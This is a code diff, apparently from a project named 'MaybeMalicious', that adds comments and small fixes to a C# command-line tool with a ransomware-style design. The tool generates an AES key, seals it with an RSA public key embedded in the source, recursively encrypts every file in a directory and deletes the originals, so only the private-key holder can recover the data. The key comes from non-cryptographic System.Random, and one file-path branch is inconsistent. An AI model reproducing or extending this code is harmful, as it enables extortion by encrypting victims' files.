@@ -5,7 +5,7 @@ using System.Security.Cryptography;
 
 namespace MaybeMalicious
 {
-    class Program
+    public class Program
     {
         public static string rsaPubKey = "MIIBCgKCAQEAyIW7MeJh/YLg45BZROKdBRl7kd3rbf1N+/vDyfluPbgZSfzz4zJ9qmVUGQhGbTBA2VuHkWv8ePXT7e6mWK0nYbePgLvoOfI7IC94EhKNk3Dw3DkKmYhsWA+e0M26RYdzIJsxmZWRBAGOL32MJnu3D+AaciG5+ZjWh+RcPKv7LEsxPWAIEMUpiFJLMnHfmt8ljlZISdNFHZ4n/mekQ6BiLNSlAAh1Nh0ggWAFqSrl/7vsAFnUIxY5UNVsOqU/Sjvsy+mNkyPbZC9QAUNj3QudRBi/zWR5mokIObZ+woGx6/7Nvm3chECgIYhpKOLktA6eSQjYx3X2V4FPW7dgp32BAQIDAQAB";
 
@@ -28,16 +28,16 @@ namespace MaybeMalicious
                     PrintHelp();
                     return;
                 }
-                
+                // We are encrypting, generate a new key to make sure it is unique
                 Random r = new Random();
                 byte[] key = new byte[32];
                 r.NextBytes(key);
                 aes.Key = key;
-
+                // Convert saved public key to an RSA object so we can encrypt our AES key
                 using RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
                 byte[] rsaPubKeyBytes = Convert.FromBase64String(rsaPubKey);
                 rsa.ImportRSAPublicKey(rsaPubKeyBytes, out int _);
-
+                // Save encrypted aes key to file so we can recover it and decrypt the files later
                 SaveKey(aes.Key, rsa);
 
                 if (kwargs["type"] == "file")
@@ -57,7 +57,7 @@ namespace MaybeMalicious
                     PrintHelp();
                     return;
                 }
-                
+                // We are decrypting, key must be provided by user, as we otherwise don't know it
                 aes.Key = Convert.FromBase64String(kwargs["key"]);
 
                 if (kwargs["type"] == "file")
@@ -77,7 +77,8 @@ namespace MaybeMalicious
                     PrintHelp();
                     return;
                 }
-
+                // Recover key from file, the private key paired to the public key stored in this file must be supplied by the user
+                // They must also point to the location of an encrypted AES key using -f
                 using RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
                 byte[] rsaPrivKeyBytes = Convert.FromBase64String(kwargs["key"]);
                 rsa.ImportRSAPrivateKey(rsaPrivKeyBytes, out int _);
@@ -92,17 +93,18 @@ namespace MaybeMalicious
 
         private static void SaveKey(byte[] key, RSACryptoServiceProvider rsa)
         {
+            // We should make sure we save the key into the working directory so it isn't lost!
             string path = Directory.GetCurrentDirectory();
-            string filePath = Path.Combine(Path.GetDirectoryName(path), "key.enc");
+            string filePath = Path.Combine(path, "key.enc");
             byte[] cryptoText = rsa.Encrypt(key, false);
-
+            // Make sure no key is lost, if there is an existing file
             int c = 0;
             while (File.Exists(filePath))
             {
                 c++;
                 filePath = Path.Combine(Path.GetDirectoryName(path), $"key{c}.enc");
             }
-
+            // Dump raw encrypted key to file
             using FileStream file = new FileStream(filePath, FileMode.Create);
             file.Write(cryptoText);
         }
@@ -114,19 +116,19 @@ namespace MaybeMalicious
                 Console.WriteLine("Cannot find key file to recover at " + keyPath);
                 return;
             }
-
+            // Read encrypted key from file (make sure we get everything!)
             using FileStream keyFile = new FileStream(keyPath, FileMode.Open);
             byte[] encKey = new byte[keyFile.Length];
             int bytesRead = 0;
-            while(bytesRead < keyFile.Length)
+            while (bytesRead < keyFile.Length)
             {
                 bytesRead += keyFile.Read(encKey);
             }
-
+            // Decrypt and encode in base 64 so we can display
             byte[] key = rsa.Decrypt(encKey, false);
             string keyText = Convert.ToBase64String(key);
             Console.WriteLine("Decrypted key: " + keyText);
-
+            // Write out key, making sure we don't overwrite any files or lose a key!
             string outKeyPath = keyPath + ".dec";
             int c = 0;
             while (File.Exists(outKeyPath))
@@ -207,7 +209,7 @@ namespace MaybeMalicious
             {
                 throw new ArgumentException("Cannot find key file at " + filePath);
             }
-
+            // We just here to read existing file
             using FileStream file = new FileStream(filePath, FileMode.Open);
             using StreamReader read = new StreamReader(file);
 
@@ -221,8 +223,9 @@ namespace MaybeMalicious
                 Console.WriteLine("Cannot find directory " + path);
                 return;
             }
+            // Enumerate files in directory and encrypt them all!
             string[] files = Directory.GetFiles(path, "*", SearchOption.AllDirectories);
-            foreach(string file in files)
+            foreach (string file in files)
             {
                 EncryptFile(file, aes);
             }
@@ -235,7 +238,7 @@ namespace MaybeMalicious
                 Console.WriteLine("Could not find file: " + filePath);
                 return;
             }
-
+            // Genereate a unique IV (initialization vector) per file (this is more secure)
             aes.GenerateIV();
 
             // Generate temporary file
@@ -248,11 +251,11 @@ namespace MaybeMalicious
             newFile.Write(aes.IV, 0, aes.IV.Length);
             using CryptoStream crypto = new CryptoStream(newFile, aes.CreateEncryptor(), CryptoStreamMode.Write);
             file.CopyTo(crypto);
-            crypto.FlushFinalBlock();
+            crypto.FlushFinalBlock(); // Maybe not necessary, but let's be safe
 
             Console.WriteLine("Encrypted file " + filePath);
             file.Close();
-            File.Delete(tempFile);
+            File.Delete(tempFile); // Don't want to leave the original file contents lying around
         }
 
         private static void DecryptDirectory(string path, AesCryptoServiceProvider aes)
@@ -262,6 +265,7 @@ namespace MaybeMalicious
                 Console.WriteLine("Cannot find directory " + path);
                 return;
             }
+            // Enumerate directory and decrypt files
             string[] files = Directory.GetFiles(path, "*", SearchOption.AllDirectories);
             foreach (string file in files)
             {
@@ -284,7 +288,9 @@ namespace MaybeMalicious
             // Load IV from encrypted file
             byte[] iv = new byte[aes.IV.Length];
             encFile.Read(iv, 0, aes.IV.Length);
-            aes.IV = iv;
+            aes.IV = iv; // Cannot read to aes.IV because of how c# treats properties
+
+            // Make sure we start reading after the IV later, because otherwise that inserts gobledygook into our decrypted file
             encFile.Seek(aes.IV.Length, SeekOrigin.Begin);
             // Create crypto stream and copy decrypted file to original file
             using CryptoStream crypto = new CryptoStream(encFile, aes.CreateDecryptor(), CryptoStreamMode.Read);
